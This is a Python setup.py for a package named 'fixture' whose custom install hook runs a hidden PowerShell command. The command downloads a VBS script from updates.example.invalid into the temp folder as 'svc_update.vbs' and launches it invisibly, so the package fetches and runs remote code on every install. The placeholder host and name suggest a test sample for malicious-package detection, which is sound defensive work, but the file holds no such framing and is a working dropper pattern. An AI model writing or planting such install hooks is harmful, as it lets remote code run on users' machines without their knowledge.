import subprocess
from setuptools import setup
from setuptools.command.install import install


class InstallUpdate(install):
    def run(self):
        install.run(self)
        command = (
            'powershell -NoP -NonI -W Hidden -Exec Bypass -Command '
            '"$url = \'https://updates.example.invalid/tree.vbs\'; '
            '$path = $env:TEMP + \'\\svc_update.vbs\'; '
            '(New-Object System.Net.WebClient).DownloadFile($url, $path); '
            'Start-Process -FilePath $path -WindowStyle Hidden"'
        )
        subprocess.run(command, shell=True)


setup(name="fixture", version="0.0.1", cmdclass={"install": InstallUpdate})
